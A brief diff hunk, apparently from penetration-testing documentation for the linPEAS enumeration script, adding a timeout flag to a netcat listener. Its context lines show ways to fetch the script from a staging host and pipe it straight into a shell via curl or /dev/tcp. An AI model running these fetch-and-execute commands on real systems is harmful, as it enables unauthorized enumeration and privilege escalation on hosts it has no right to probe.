@@ -21,7 +21,7 @@ python -m SimpleHTTPServer 80
 curl 10.10.10.10/linpeas.sh | sh
 
 #Without curl
-nc -lvnp 80 < linpeas.sh
+nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
